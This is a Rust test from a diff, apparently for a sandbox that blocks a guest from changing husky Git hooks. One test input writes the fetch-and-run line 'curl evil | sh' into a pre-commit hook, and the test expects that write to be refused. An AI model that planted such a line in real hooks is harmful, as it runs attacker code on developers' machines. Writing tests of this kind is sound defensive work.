+#[test]
+fn r15_husky_v9_hooks_are_refused_without_ever_looking_up_dot_git() {
+    let mut share = folder(|root| {
+        plant_repo(&root.join("app"), &format!("{PLAIN_CONFIG}\thooksPath = .husky/_\n"));
+        fs::create_dir_all(root.join("app/.husky/_")).unwrap();
+        fs::write(root.join("app/.husky/_/h"), b"#!/bin/sh\n. \"$(dirname \"$0\")/../$(basename \"$0\")\"\n").unwrap();
+        fs::write(root.join("app/.husky/_/pre-commit"), b"#!/bin/sh\n. \"$(dirname \"$0\")/h\"\n").unwrap();
+        fs::write(root.join("app/.husky/pre-commit"), b"npm test\n").unwrap();
+        fs::write(root.join("app/.husky/notes.md"), b"notes\n").unwrap();
+    });
+    // The guest goes straight for .husky/pre-commit.
+    assert_eq!(share.open_w("app/.husky/pre-commit"), EPERM);
+    assert_eq!(share.rewrite("app/.husky/pre-commit", b"curl evil | sh\n"), EPERM);
+    let hook = share.at("app/.husky/pre-commit");
+    assert_eq!(share.setattr(hook, FATTR_MODE, 0o755, 0).error, EPERM);
+    assert_eq!(share.rm("app/.husky/pre-commit"), EPERM);
+    assert_eq!(share.ren("app/.husky/pre-commit", "app/.husky/x"), EPERM);
+    // A hook that does not exist yet.
+    assert_eq!(share.put("app/.husky/pre-push", b"evil\n"), EPERM);
+    assert_eq!(share.put("app/.husky/post-checkout", b"evil\n"), EPERM);
+    assert_eq!(share.sym("app/.husky/commit-msg", "/bin/sh"), EPERM);
+    assert_eq!(share.put("app/.husky/elsewhere", b"x\n"), 0);
+    assert_eq!(share.ren("app/.husky/elsewhere", "app/.husky/pre-rebase"), EPERM);
+    // The hooksPath tree itself.
+    assert_eq!(share.open_w("app/.husky/_/h"), EPERM);
+    assert_eq!(share.put("app/.husky/_/pre-push", b""), EPERM);
+    assert!(!share.root.join("app/.husky/_/pre-push").exists());
+    assert_eq!(share.rd("app/.husky/_"), EPERM);
+    // Ancestors cannot be moved out from under the names.
+    assert_eq!(share.ren("app/.husky", "app/husky-old"), EPERM);
+    assert_eq!(share.ren("app", "app2"), EPERM);
+    // Ordinary files beside them stay ordinary work.
+    assert_eq!(share.rewrite("app/.husky/notes.md", b"more notes\n"), 0);
+    assert_eq!(fs::read(share.root.join("app/.husky/pre-commit")).unwrap(), b"npm test\n");
+    // Removing core.hooksPath is allowed, but the tracked set never shrinks within an incarnation (the
+    // user's next `npm install` would put it back).
+    assert_eq!(share.lock_rename("app/.git/config", PLAIN_CONFIG.as_bytes()), 0);
+    assert_eq!(share.open_w("app/.husky/pre-commit"), EPERM);
+    assert_eq!(share.put("app/.husky/pre-push", b"evil\n"), EPERM);
+    assert_eq!(share.notices(), vec![NoticeKind::GitProtected]);
+}
